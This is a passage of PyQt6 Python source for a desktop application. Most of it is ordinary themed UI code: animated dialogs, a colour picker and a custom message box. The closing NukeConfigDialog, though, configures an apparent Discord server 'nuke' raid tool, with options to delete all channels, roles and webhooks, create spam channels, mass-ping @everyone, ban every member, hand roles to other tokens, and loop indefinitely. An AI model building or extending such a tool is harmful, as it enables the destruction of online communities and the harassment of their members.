        title_label.setStyleSheet("color: #63b3ed; font-size: 14px; font-weight: bold; background: transparent;")

        close_btn = AnimatedButton("×")
        close_btn.setFixedSize(28, 28)
        close_btn.setFont(QFont("Segoe UI", 14))
        close_btn.setStyleSheet("""
            QPushButton { background: transparent; border: none; border-radius: 6px; color: rgba(255, 255, 255, 0.7); }
            QPushButton:hover { background: rgba(255, 255, 255, 0.1); color: white; }
        """)
        close_btn.clicked.connect(self.reject)

        title_bar_layout.addWidget(title_label)
        title_bar_layout.addStretch()
        title_bar_layout.addWidget(close_btn)
        self.content_layout.addWidget(self.title_bar)

    def showEvent(self, event):
        super().showEvent(event)
        if not self.performance_mode:
            self.start_show_animation()

    def start_show_animation(self):
        fade_in = QPropertyAnimation(self, b"windowOpacity")
        fade_in.setDuration(300)
        fade_in.setStartValue(0.0)
        fade_in.setEndValue(1.0)
        fade_in.setEasingCurve(QEasingCurve.Type.InOutQuad)

        slide_up = QPropertyAnimation(self, b"pos")
        start_pos = self.pos()
        slide_up.setDuration(300)
        slide_up.setStartValue(QPoint(start_pos.x(), start_pos.y() + 40))
        slide_up.setEndValue(start_pos)
        slide_up.setEasingCurve(QEasingCurve.Type.OutCubic)

        self.animation = QParallelAnimationGroup(self)
        self.animation.addAnimation(fade_in)
        self.animation.addAnimation(slide_up)
        self.animation.start()

    def _start_close_animation(self):
        if self._is_closing: return
        self._is_closing = True

        if self.performance_mode:
            self._on_animation_finished()
            return

        fade_out = QPropertyAnimation(self, b"windowOpacity")
        fade_out.setDuration(180)
        fade_out.setStartValue(1.0)
        fade_out.setEndValue(0.0)
        fade_out.setEasingCurve(QEasingCurve.Type.InQuad)

        self.animation = fade_out
        self.animation.finished.connect(self._on_animation_finished)
        self.animation.start()

    def _on_animation_finished(self):
        if self._result == QDialog.DialogCode.Accepted:
            super().accept()
        else:
            super().reject()

    def accept(self):
        self._result = QDialog.DialogCode.Accepted
        self._start_close_animation()

    def reject(self):
        self._result = QDialog.DialogCode.Rejected
        self._start_close_animation()
            
    def closeEvent(self, event):
        event.ignore()
        self.reject()

    def resizeEvent(self, event):
        self.background.setGeometry(self.rect())
        super().resizeEvent(event)
        self.target_pos = QPointF(self.pos())

    def moveEvent(self, event):
        if not self.drag_timer.isActive():
            self.target_pos = QPointF(self.pos())
        super().moveEvent(event)

    def _update_drag_position(self):
        if self.performance_mode:
            self.move(self.target_pos.toPoint())
            if self.drag_timer.isActive():
                self.drag_timer.stop()
            return

        current_pos = QPointF(self.pos())
        dx = self.target_pos.x() - current_pos.x()
        dy = self.target_pos.y() - current_pos.y()

        if abs(dx) < 1 and abs(dy) < 1:
            self.move(self.target_pos.toPoint())
            self.drag_timer.stop()
        else:
            new_x = int(current_pos.x() + dx * self.lerp_factor)
            new_y = int(current_pos.y() + dy * self.lerp_factor)
            self.move(new_x, new_y)

    def mousePressEvent(self, event):
        is_on_top_bar = (hasattr(self, 'title_bar') and
                         self.title_bar.geometry().contains(event.pos()))

        if event.button() == Qt.MouseButton.LeftButton and is_on_top_bar:
            self.drag_position = event.globalPosition() - QPointF(self.frameGeometry().topLeft())
            event.accept()
        else:
            super().mousePressEvent(event)

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.MouseButton.LeftButton and self.drag_position is not None:
            self.target_pos = event.globalPosition() - self.drag_position
            
            if self.performance_mode:
                self.move(self.target_pos.toPoint())
            elif not self.drag_timer.isActive():
                self.drag_timer.start()
            event.accept()
        else:
            super().mouseMoveEvent(event)

    def mouseReleaseEvent(self, event):
        was_dragging = self.drag_position is not None
        self.drag_position = None 
        if was_dragging:
            event.accept()
        else:
            super().mouseReleaseEvent(event)

class HueSlider(QWidget):
    """A vertical slider for selecting color hue with smooth animation."""
    hueChanged = pyqtSignal(float)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedWidth(20)
        self._hue = 0.0
        self.visual_y = 0.0
        self.target_y = 0.0
        self.update_timer = QTimer(self)
        self.update_timer.setInterval(8)
        self.update_timer.timeout.connect(self._update_visual_y)
        self.lerp_factor = 0.15

    def setHue(self, hue):
        """Sets the hue and snaps the indicator to the new position."""
        self._hue = hue
        new_y = self.height() * (1.0 - self._hue)
        self.target_y = new_y
        self.visual_y = new_y
        self.update()

    def _update_visual_y(self):
        """Smoothly moves the indicator towards the target position."""
        diff = self.target_y - self.visual_y
        
        if abs(diff) < 0.1:
            self.visual_y = self.target_y
            self.update_timer.stop()
        else:
            self.visual_y += diff * self.lerp_factor
        
        if self.height() > 0:
            self._hue = 1.0 - (self.visual_y / self.height())
            self.hueChanged.emit(self._hue)
        
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        gradient = QLinearGradient(0, self.height(), 0, 0)
        gradient.setColorAt(0.0, Qt.GlobalColor.red)
        gradient.setColorAt(1/6, Qt.GlobalColor.yellow)
        gradient.setColorAt(2/6, Qt.GlobalColor.green)
        gradient.setColorAt(3/6, Qt.GlobalColor.cyan)
        gradient.setColorAt(4/6, Qt.GlobalColor.blue)
        gradient.setColorAt(5/6, Qt.GlobalColor.magenta)
        gradient.setColorAt(1.0, Qt.GlobalColor.red)
        
        painter.fillRect(self.rect(), gradient)
        
        indicator_rect = QRect(0, int(self.visual_y - 2), self.width(), 4)
        painter.setPen(QPen(Qt.GlobalColor.white, 2))
        painter.setBrush(Qt.BrushStyle.NoBrush)
        painter.drawRect(indicator_rect)

    def mousePressEvent(self, event):
        self._update_target_pos(event.position().y())

    def mouseMoveEvent(self, event):
        if event.buttons() & Qt.MouseButton.LeftButton:
            self._update_target_pos(event.position().y())

    def _update_target_pos(self, y_pos):
        """Sets the target for the animation based on mouse position."""
        clamped_y = max(0.0, min(float(self.height()), float(y_pos)))
        self.target_y = clamped_y
        
        if not self.update_timer.isActive():
            self.update_timer.start()
            
    def resizeEvent(self, event):
        super().resizeEvent(event)
        new_y = self.height() * (1.0 - self._hue)
        self.target_y = new_y
        self.visual_y = new_y
        self.update()

class SaturationValuePicker(QWidget):
    """The main 2D color picker square with smooth indicator movement."""
    colorChanged = pyqtSignal(QColor)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumSize(256, 256)
        self._hue = 0.0
        self._saturation = 1.0
        self._value = 1.0
        
        self.indicator_pos = QPointF(self.width(), 0)
        self.target_pos = QPointF(self.width(), 0)
        self.drag_timer = QTimer(self)
        self.drag_timer.setInterval(8) # ~125 FPS
        self.drag_timer.timeout.connect(self._update_indicator_pos)
        self.lerp_factor = 0.15

    def setHue(self, hue):
        self._hue = hue
        self.update()
        self._emit_color()

    def setColor(self, color):
        self._hue = color.hueF()
        self._saturation = color.saturationF()
        self._value = color.valueF()
        self.target_pos = QPointF(self._saturation * self.width(), (1.0 - self._value) * self.height())
        self.indicator_pos = self.target_pos
        self.update()
        self._emit_color()

    def _update_indicator_pos(self):
        current_pos = self.indicator_pos
        dx = self.target_pos.x() - current_pos.x()
        dy = self.target_pos.y() - current_pos.y()

        if abs(dx) < 0.1 and abs(dy) < 0.1:
            self.indicator_pos = self.target_pos
            self.drag_timer.stop()
        else:
            new_x = current_pos.x() + dx * self.lerp_factor
            new_y = current_pos.y() + dy * self.lerp_factor
            self.indicator_pos = QPointF(new_x, new_y)
        
        self._saturation = self.indicator_pos.x() / self.width()
        self._value = 1.0 - (self.indicator_pos.y() / self.height())
        self._emit_color()
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        
        sat_gradient = QLinearGradient(0, 0, self.width(), 0)
        sat_gradient.setColorAt(0, Qt.GlobalColor.white)
        sat_gradient.setColorAt(1, QColor.fromHsvF(self._hue, 1.0, 1.0))
        painter.fillRect(self.rect(), sat_gradient)
        
        val_gradient = QLinearGradient(0, 0, 0, self.height())
        val_gradient.setColorAt(0, Qt.GlobalColor.transparent)
        val_gradient.setColorAt(1, Qt.GlobalColor.black)
        painter.fillRect(self.rect(), val_gradient)
        
        painter.setPen(QPen(Qt.GlobalColor.white, 2))
        painter.drawEllipse(self.indicator_pos, 7, 7)
        painter.setPen(QPen(Qt.GlobalColor.black, 2))
        painter.drawEllipse(self.indicator_pos, 9, 9)

    def _update_target_pos(self, local_pos):
        """
        This function takes a mouse position, clamps it to be inside the widget's
        boundaries, and then sets it as the target for the smooth animation.
        """
        clamped_x = max(0.0, min(local_pos.x(), self.width()))
        clamped_y = max(0.0, min(local_pos.y(), self.height()))
        self.target_pos = QPointF(clamped_x, clamped_y)
        
        if not self.drag_timer.isActive():
            self.drag_timer.start()

    def mousePressEvent(self, event):
        self._update_target_pos(event.position())

    def mouseMoveEvent(self, event):
        if event.buttons() & Qt.MouseButton.LeftButton:
            self._update_target_pos(event.position())
            
    def _emit_color(self):
        color = QColor.fromHsvF(self._hue, self._saturation, self._value)
        self.colorChanged.emit(color)





class ModernLineEdit(QLineEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedHeight(52)
        self.setFont(QFont("Segoe UI", 11))

        # --- MODIFICATION: Dynamically remove CSS transitions ---
        stylesheet = """
            QLineEdit {
                background: rgba(26, 32, 44, 0.6);
                border: 1.5px solid rgba(74, 85, 104, 0.4);
                border-radius: 26px;
                color: white;
                padding: 0px 20px;
                selection-background-color: rgba(99, 179, 237, 0.3);
                font-size: 11px;
                transition: border-color 0.2s ease-out, background 0.2s ease-out;
            }
            QLineEdit:focus {
                border: 1.5px solid rgba(99, 179, 237, 0.8);
                background: rgba(26, 32, 44, 0.8);
                box-shadow: 0 0 0 3px rgba(99, 179, 237, 0.1);
                color: white;
            }
            QLineEdit::placeholder {
                color: rgba(160, 174, 192, 0.6);
            }
        """
        
        main_window = self.window()
        performance_mode = False
        if hasattr(main_window, 'main_gui') and main_window.main_gui and hasattr(main_window.main_gui, 'performance_mode_check'):
            performance_mode = main_window.main_gui.performance_mode_check.isChecked()

        if performance_mode:
            stylesheet = re.sub(r'transition: .*?;', '', stylesheet)

        self.setStyleSheet(stylesheet)
        # --- END MODIFICATION ---

class ModernTextEdit(QTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        
        # --- MODIFICATION: Dynamically remove CSS transitions ---
        stylesheet = """
            QTextEdit {
                background: rgba(26, 32, 44, 0.6);
                border: 1.5px solid rgba(74, 85, 104, 0.4);
                border-radius: 12px;
                color: white;
                padding: 10px;
                selection-background-color: rgba(99, 179, 237, 0.3);
                font-size: 11px;
                transition: border-color 0.2s ease-out, background 0.2s ease-out;
            }
            QTextEdit:focus {
                border: 1.5px solid rgba(99, 179, 237, 0.8);
                background: rgba(26, 32, 44, 0.8);
            }
        """
        main_window = self.window()
        performance_mode = False
        if hasattr(main_window, 'main_gui') and main_window.main_gui and hasattr(main_window.main_gui, 'performance_mode_check'):
            performance_mode = main_window.main_gui.performance_mode_check.isChecked()

        if performance_mode:
            stylesheet = re.sub(r'transition: .*?;', '', stylesheet)
            
        self.setStyleSheet(stylesheet)
        # --- END MODIFICATION ---


        
class CustomMessageBox(StyledDialog):
    """
    A custom, styled message box that replaces QMessageBox and inherits
    the animated background and theme from StyledDialog.
    This version loads custom icons from 'midnight images' folder.
    """
    def __init__(self, parent=None):
        super().__init__("Message", parent) # Default title
        self.result = QMessageBox.StandardButton.NoButton

        self.content_layout.setSpacing(15) # Increased spacing slightly
        self.message_layout = QHBoxLayout()
        self.message_layout.setContentsMargins(15, 10, 15, 10)
        self.message_layout.setSpacing(15)
        
        self.icon_label = QLabel(self)
        # Increased size slightly to accommodate custom art better
        self.icon_label.setFixedSize(48, 48) 
        self.icon_label.setScaledContents(False) # We will scale the pixmap manually for quality
        self.icon_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        self.message_layout.addWidget(self.icon_label)
        
        self.text_label = QLabel(self)
        self.text_label.setWordWrap(True)
        self.text_label.setMinimumWidth(250)
        self.text_label.setStyleSheet("color: #E2E8F0; font-size: 13px; background: transparent; font-weight: 500;")
        self.message_layout.addWidget(self.text_label)
        
        self.button_box = QDialogButtonBox(self)
        self.button_box.clicked.connect(self.handle_button_click)
        
        self.content_layout.addLayout(self.message_layout)
        self.content_layout.addWidget(self.button_box)

    def handle_button_click(self, button):
        role = self.button_box.buttonRole(button)
        if role == QDialogButtonBox.ButtonRole.YesRole:
            self.result = QMessageBox.StandardButton.Yes
        elif role == QDialogButtonBox.ButtonRole.NoRole:
            self.result = QMessageBox.StandardButton.No
        elif role == QDialogButtonBox.ButtonRole.AcceptRole:
            self.result = QMessageBox.StandardButton.Ok
        elif role == QDialogButtonBox.ButtonRole.RejectRole:
            self.result = QMessageBox.StandardButton.Cancel
        else:
            self.result = QMessageBox.StandardButton(self.button_box.standardButton(button))
        self.accept()

    def setText(self, text):
        self.text_label.setText(text)

    def setWindowTitle(self, title):
        # Updates the title in the custom title bar of StyledDialog
        for child in self.central_frame.findChildren(QFrame)[0].findChildren(QLabel):
            if child.font().bold():
                child.setText(title)
                return

    def setStandardButtons(self, buttons: QMessageBox.StandardButton):
        dialog_buttons = QDialogButtonBox.StandardButton.NoButton
        if buttons & QMessageBox.StandardButton.Ok: dialog_buttons |= QDialogButtonBox.StandardButton.Ok
        if buttons & QMessageBox.StandardButton.Open: dialog_buttons |= QDialogButtonBox.StandardButton.Open
        if buttons & QMessageBox.StandardButton.Save: dialog_buttons |= QDialogButtonBox.StandardButton.Save
        if buttons & QMessageBox.StandardButton.Cancel: dialog_buttons |= QDialogButtonBox.StandardButton.Cancel
        if buttons & QMessageBox.StandardButton.Close: dialog_buttons |= QDialogButtonBox.StandardButton.Close
        if buttons & QMessageBox.StandardButton.Discard: dialog_buttons |= QDialogButtonBox.StandardButton.Discard
        if buttons & QMessageBox.StandardButton.Apply: dialog_buttons |= QDialogButtonBox.StandardButton.Apply
        if buttons & QMessageBox.StandardButton.Reset: dialog_buttons |= QDialogButtonBox.StandardButton.Reset
        if buttons & QMessageBox.StandardButton.RestoreDefaults: dialog_buttons |= QDialogButtonBox.StandardButton.RestoreDefaults
        if buttons & QMessageBox.StandardButton.Help: dialog_buttons |= QDialogButtonBox.StandardButton.Help
        if buttons & QMessageBox.StandardButton.SaveAll: dialog_buttons |= QDialogButtonBox.StandardButton.SaveAll
        if buttons & QMessageBox.StandardButton.Yes: dialog_buttons |= QDialogButtonBox.StandardButton.Yes
        if buttons & QMessageBox.StandardButton.YesToAll: dialog_buttons |= QDialogButtonBox.StandardButton.YesToAll
        if buttons & QMessageBox.StandardButton.No: dialog_buttons |= QDialogButtonBox.StandardButton.No
        if buttons & QMessageBox.StandardButton.NoToAll: dialog_buttons |= QDialogButtonBox.StandardButton.NoToAll
        if buttons & QMessageBox.StandardButton.Abort: dialog_buttons |= QDialogButtonBox.StandardButton.Abort
        if buttons & QMessageBox.StandardButton.Retry: dialog_buttons |= QDialogButtonBox.StandardButton.Retry
        if buttons & QMessageBox.StandardButton.Ignore: dialog_buttons |= QDialogButtonBox.StandardButton.Ignore
        
        self.button_box.setStandardButtons(dialog_buttons)
        
        for button in self.button_box.buttons():
            button.setMinimumHeight(32)
            button.setFont(QFont("Segoe UI", 9, QFont.Weight.Normal))
            button.setStyleSheet("""
                QPushButton {
                    background: transparent; border: 1px solid rgba(255, 255, 255, 0.2);
                    border-radius: 8px; color: rgba(255, 255, 255, 0.9); padding: 5px 15px;
                }
                QPushButton:hover {
                    background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.3); color: white;
                }
                QPushButton:pressed {
                    background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.4);
                }
                QPushButton:default {
                    border: 1px solid rgba(99, 179, 237, 0.8);
                }
            """)

    def setDefaultButton(self, button: QMessageBox.StandardButton):
        qt_button = None
        if button == QMessageBox.StandardButton.Yes: qt_button = self.button_box.button(QDialogButtonBox.StandardButton.Yes)
        elif button == QMessageBox.StandardButton.No: qt_button = self.button_box.button(QDialogButtonBox.StandardButton.No)
        elif button == QMessageBox.StandardButton.Ok: qt_button = self.button_box.button(QDialogButtonBox.StandardButton.Ok)
        elif button == QMessageBox.StandardButton.Cancel: qt_button = self.button_box.button(QDialogButtonBox.StandardButton.Cancel)
        else: qt_button = self.button_box.button(QDialogButtonBox.StandardButton(button))

        if qt_button:
            qt_button.setDefault(True)

    def setIcon(self, icon):
        pixmap = QPixmap()
        custom_image_name = None
        
        # 1. Determine current directory (handles frozen exe and dev script)
        if getattr(sys, 'frozen', False):
            base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
            
        images_dir = os.path.join(base_path, "midnight images")

        # 2. Map icon types to filenames
        if icon == QMessageBox.Icon.Warning:
            custom_image_name = "Warning.png"
        elif icon == QMessageBox.Icon.Critical:
            custom_image_name = "Critical.png"
        elif icon == QMessageBox.Icon.Question:
            custom_image_name = "Question.png"
        elif icon == QMessageBox.Icon.Information:
            # Tries to load Information.png if exists, otherwise falls back
            custom_image_name = "Information.png" 

        # 3. Attempt to load custom image
        loaded_custom = False
        if custom_image_name:
            full_path = os.path.join(images_dir, custom_image_name)
            if os.path.exists(full_path):
                loaded = pixmap.load(full_path)
                if loaded and not pixmap.isNull():
                    loaded_custom = True
                else:
                    print(f"[WARNING] Found {custom_image_name} but failed to load it.")
            else:
                # Only print if it's not Information (since you didn't explicitly ask for it)
                if custom_image_name != "Information.png":
                    print(f"[WARNING] Custom icon not found: {full_path}")

        # 4. Fallback to Standard Icons if custom load failed
        if not loaded_custom:
            if icon == QMessageBox.Icon.Warning:
                pixmap = self.style().standardPixmap(QStyle.StandardPixmap.SP_MessageBoxWarning)
            elif icon == QMessageBox.Icon.Information:
                pixmap = self.style().standardPixmap(QStyle.StandardPixmap.SP_MessageBoxInformation)
            elif icon == QMessageBox.Icon.Question:
                pixmap = self.style().standardPixmap(QStyle.StandardPixmap.SP_MessageBoxQuestion)
            elif icon == QMessageBox.Icon.Critical:
                pixmap = self.style().standardPixmap(QStyle.StandardPixmap.SP_MessageBoxCritical)
        
        # 5. Apply Pixmap
        if not pixmap.isNull():
            # Scale for high quality (48x48 fits the new size)
            scaled_pixmap = pixmap.scaled(48, 48, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
            self.icon_label.setPixmap(scaled_pixmap)
            self.icon_label.show()
        else:
            self.icon_label.hide()

    # Static helper methods (API compatible with QMessageBox)
    @staticmethod
    def warning(parent, title, text, buttons=QMessageBox.StandardButton.Ok, defaultButton=QMessageBox.StandardButton.NoButton):
        dialog = CustomMessageBox(parent)
        dialog.setWindowTitle(title)
        dialog.setText(text)
        dialog.setIcon(QMessageBox.Icon.Warning)
        dialog.setStandardButtons(buttons)
        if defaultButton != QMessageBox.StandardButton.NoButton:
            dialog.setDefaultButton(defaultButton)
        dialog.exec()
        return dialog.result

    @staticmethod
    def information(parent, title, text, buttons=QMessageBox.StandardButton.Ok, defaultButton=QMessageBox.StandardButton.NoButton):
        dialog = CustomMessageBox(parent)
        dialog.setWindowTitle(title)
        dialog.setText(text)
        dialog.setIcon(QMessageBox.Icon.Information)
        dialog.setStandardButtons(buttons)
        if defaultButton != QMessageBox.StandardButton.NoButton:
            dialog.setDefaultButton(defaultButton)
        dialog.exec()
        return dialog.result

    @staticmethod
    def critical(parent, title, text, buttons=QMessageBox.StandardButton.Ok, defaultButton=QMessageBox.StandardButton.NoButton):
        dialog = CustomMessageBox(parent)
        dialog.setWindowTitle(title)
        dialog.setText(text)
        dialog.setIcon(QMessageBox.Icon.Critical) 
        dialog.setStandardButtons(buttons)
        if defaultButton != QMessageBox.StandardButton.NoButton:
            dialog.setDefaultButton(defaultButton)
        dialog.exec()
        return dialog.result

    @staticmethod
    def question(parent, title, text, buttons=QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, defaultButton=QMessageBox.StandardButton.NoButton):
        dialog = CustomMessageBox(parent)
        dialog.setWindowTitle(title)
        dialog.setText(text)
        dialog.setIcon(QMessageBox.Icon.Question)
        dialog.setStandardButtons(buttons)
        if defaultButton != QMessageBox.StandardButton.NoButton:
            dialog.setDefaultButton(defaultButton)
        dialog.exec()
        return dialog.result
    
class ActionPickerDialog(StyledDialog):
    """A custom dialog for selecting an action, matching the app's theme."""
    def __init__(self, items, parent=None):
        super().__init__("Select Action", parent)
        self.setMinimumSize(400, 500)
        self.selected_item = None
        container = QFrame()
        container.setStyleSheet("background:transparent;")
        layout = QVBoxLayout(container)
        layout.setContentsMargins(0, 5, 0, 10)
        layout.setSpacing(15)

        label = QLabel("Choose an action to add:")
        label.setStyleSheet("color: white; background: transparent; padding-bottom: 5px;")
        layout.addWidget(label)
        self.list_widget = QListWidget()
        self.list_widget.addItems(items)
        self.list_widget.setStyleSheet("""
            QListWidget { 
                background: rgba(26, 32, 44, 0.7); 
                border: 1.5px solid rgba(74, 85, 104, 0.4); 
                border-radius: 12px; 
                color: white; 
                padding: 5px; 
                selection-background-color: rgba(99, 179, 237, 0.3); 
            }
            QListWidget::item { 
                padding: 8px; 
                color: #E2E8F0; /* Light gray-white text */
            }
            QListWidget::item:selected { 
                background: rgba(99, 179, 237, 0.5); 
                border: 1px solid rgba(99, 179, 237, 0.8); 
                border-radius: 6px; 
                color: white; /* Brighter white on selection */
            }
        """)
        self.list_widget.itemDoubleClicked.connect(self.accept)
        layout.addWidget(self.list_widget)
        button_layout = QHBoxLayout()
        button_layout.addStretch()
        cancel_btn = MinimalButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        ok_btn = MinimalButton("OK")
        ok_btn.setDefault(True)
        ok_btn.clicked.connect(self.accept)
        button_layout.addWidget(cancel_btn)
        button_layout.addWidget(ok_btn)
        layout.addLayout(button_layout)
        self.content_layout.addWidget(container)

    def selected_action(self):
        if self.list_widget.currentItem():
            return self.list_widget.currentItem().text()
        return None

    def accept(self):
        if self.list_widget.currentItem():
            self.selected_item = self.list_widget.currentItem().text()
            super().accept()
        else:
            QMessageBox.warning(self, "No Selection", "Please select an action from the list.")

class ModernColorPickerDialog(StyledDialog):
    """A fully custom, modern color picker dialog."""
    def __init__(self, initial_color=Qt.GlobalColor.white, parent=None):
        super().__init__("Select Color", parent)
        self.setMinimumSize(360, 420)
        self._color = initial_color
        container = QFrame(self.central_frame)
        container.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(container)
        picker_layout = QHBoxLayout()
        self.sv_picker = SaturationValuePicker()
        self.hue_slider = HueSlider()
        picker_layout.addWidget(self.sv_picker)
        picker_layout.addSpacing(15)
        picker_layout.addWidget(self.hue_slider)
        layout.addLayout(picker_layout)
        preview_layout = QHBoxLayout()
        self.preview = QFrame()
        self.preview.setFixedSize(50, 50)
        self.hex_input = ModernLineEdit()
        self.hex_input.setPlaceholderText("#RRGGBB")
        preview_layout.addWidget(self.preview)
        preview_layout.addSpacing(10)
        preview_layout.addWidget(self.hex_input)
        layout.addLayout(preview_layout)
        button_box = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        for button in button_box.buttons():
            button.setMinimumHeight(32)
            button.setStyleSheet("""
                QPushButton { background: transparent; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: white; padding: 5px 15px; }
                QPushButton:hover { background: rgba(255,255,255,0.1); }
            """)
        layout.addWidget(button_box)
        self.content_layout.addWidget(container)
        self.hue_slider.hueChanged.connect(self.sv_picker.setHue)
        self.sv_picker.colorChanged.connect(self.update_color)
        self.hex_input.editingFinished.connect(self.hex_color_changed)
        self.sv_picker.setColor(initial_color)
        self.hue_slider.setHue(initial_color.hueF())
        
    def update_color(self, color):
        self._color = color
        self.preview.setStyleSheet(f"background-color: {color.name()}; border-radius: 8px;")
        self.hex_input.blockSignals(True)
        self.hex_input.setText(color.name().upper())
        self.hex_input.blockSignals(False)
        
    def hex_color_changed(self):
        color = QColor(self.hex_input.text())
        if color.isValid():
            self._color = color
            self.sv_picker.setColor(color)
            self.hue_slider.setHue(color.hueF())

    def currentColor(self):
        return self._color
    




class NukeConfigDialog(StyledDialog):
    """
    A comprehensive, tabbed dialog for configuring all aspects of the Nuke action for a custom command.
    Mirrors the advanced options available in the main GUI.
    """

    def __init__(self, parent=None, previous_config=None):
        super().__init__("Configure Nuke Action", parent)
        self.setMinimumSize(500, 620)
        container = QFrame()
        container.setStyleSheet("background:transparent;")
        layout = QVBoxLayout(container)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(15)
        self.tab_widget = QTabWidget()
        self.tab_widget.setStyleSheet("""
            QTabWidget::pane { 
                border: 1px solid rgba(74, 85, 104, 0.4); 
                border-top: none;
                background: rgba(18, 22, 33, 0.8);
                border-bottom-left-radius: 8px;
                border-bottom-right-radius: 8px;
            }
            QTabBar::tab {
                background: rgba(26, 32, 44, 0.7);
                border: 1px solid rgba(74, 85, 104, 0.4);
                border-bottom: none; 
                padding: 8px 20px;
                color: rgba(255, 255, 255, 0.7);
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
                margin-right: 2px;
            }
            QTabBar::tab:hover {
                background: rgba(45, 55, 72, 0.8);
            }
            QTabBar::tab:selected {
                background: rgba(18, 22, 33, 0.8);
                color: white;
                border: 1px solid rgba(99, 179, 237, 0.6);
                border-bottom: 1px solid rgba(18, 22, 33, 0.8);
            }
        """)

        self.tab_widget.addTab(self._create_destruction_tab(previous_config), "Destruction")
        self.tab_widget.addTab(self._create_creation_tab(previous_config), "Creation & Spam")
        self.tab_widget.addTab(self._create_advanced_tab(previous_config), "Advanced")
        layout.addWidget(self.tab_widget)
        button_layout = QHBoxLayout()
        button_layout.addStretch()
        cancel_btn = MinimalButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        ok_btn = MinimalButton("OK")
        ok_btn.clicked.connect(self.accept)
        button_layout.addWidget(cancel_btn)
        button_layout.addWidget(ok_btn)
        layout.addLayout(button_layout)
        self.content_layout.addWidget(container)

    def _create_destruction_tab(self, previous_config):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        self.destruction_checks = {
            "delete_channels": AnimatedCheckBox("Delete All Channels"),
            "delete_roles": AnimatedCheckBox("Delete All Roles"),
            "delete_webhooks": AnimatedCheckBox("Delete All Webhooks"),
        }
        for key, check in self.destruction_checks.items():
            if previous_config:
                check.setChecked(previous_config.get("destruction_options", {}).get(key, False))
            else:
                check.setChecked(True)  
            layout.addWidget(check)

        layout.addStretch()
        return widget

    def _create_creation_tab(self, previous_config):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        self.creation_checks = {
            "create_spam": AnimatedCheckBox("Create Spam Channels (Maxed)"),
            "create_6_channels": AnimatedCheckBox("Create 6 Channels (Default)"),
            "spam_all_channels_post_nuke": AnimatedCheckBox("Spam All Channels Post-Nuke"),
            "use_webhook_ping": AnimatedCheckBox("Use Webhooks for Pinging (@everyone)")
        }

        if previous_config:
            for key, check in self.creation_checks.items():
                check.setChecked(previous_config.get("destruction_options", {}).get(key, False))
        else: 
            self.creation_checks["create_6_channels"].setChecked(True)

        layout.addWidget(self.creation_checks["create_spam"])


        self.create_duration_widget = self._create_slider_widget(
            "Duration (s):", 5, 120,
            previous_config.get('channel_creation_duration', 60) if previous_config else 60
        )
        layout.addWidget(self.create_duration_widget)
        self.creation_checks["create_spam"].toggled.connect(self.create_duration_widget.setVisible)
        self.create_duration_widget.setVisible(self.creation_checks["create_spam"].isChecked())
        layout.addSpacing(15)

        layout.addWidget(self.creation_checks["create_6_channels"])
        layout.addSpacing(15)

        layout.addWidget(self.creation_checks["spam_all_channels_post_nuke"])
        layout.addWidget(self.creation_checks["use_webhook_ping"])

        self.post_nuke_spam_widget = self._create_slider_widget(
            "Messages/Pings per Channel:", 1, 30,
            previous_config.get('post_nuke_spam_count', 5) if previous_config else 5
        )
        layout.addWidget(self.post_nuke_spam_widget)
        def toggle_spam_slider():
            is_visible = self.creation_checks["spam_all_channels_post_nuke"].isChecked() or \
                         self.creation_checks["use_webhook_ping"].isChecked()
            self.post_nuke_spam_widget.setVisible(is_visible)

        self.creation_checks["spam_all_channels_post_nuke"].toggled.connect(toggle_spam_slider)
        self.creation_checks["use_webhook_ping"].toggled.connect(toggle_spam_slider)
        toggle_spam_slider() 

        layout.addStretch()
        return widget

    def _create_advanced_tab(self, previous_config):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        self.advanced_checks = {
            "rename_server": AnimatedCheckBox("Rename Server & Set Icon"),
            "ban_all_enabled": AnimatedCheckBox("Ban All Members on Nuke"),
            "give_all_other_tokens_best_role": AnimatedCheckBox("Give All Other Tokens Best Role"),
            "infinite_loop": AnimatedCheckBox("Infinite Loop Mode")
        }

        layout.addWidget(self.advanced_checks["rename_server"])
        self.custom_server_name_input = ModernLineEdit()
        self.custom_server_name_input.setPlaceholderText("Custom Server Name (optional)")
        layout.addWidget(self.custom_server_name_input)

        self.pfp_path_input = ModernLineEdit()
        self.pfp_path_input.setPlaceholderText("Path to PFP image (optional)")
        layout.addWidget(self.pfp_path_input)

        layout.addWidget(self.advanced_checks["ban_all_enabled"])
        layout.addWidget(self.advanced_checks["give_all_other_tokens_best_role"])
        layout.addWidget(self.advanced_checks["infinite_loop"])
        if previous_config:
            for key, check in self.advanced_checks.items():
                check.setChecked(previous_config.get("destruction_options", {}).get(key, False))
            self.custom_server_name_input.setText(previous_config.get('custom_server_name', ''))
            self.pfp_path_input.setText(previous_config.get('server_pfp_path', ''))
        layout.addStretch()
        return widget

    def _create_slider_widget(self, label_text, min_val, max_val, initial_val):
        widget = QWidget()
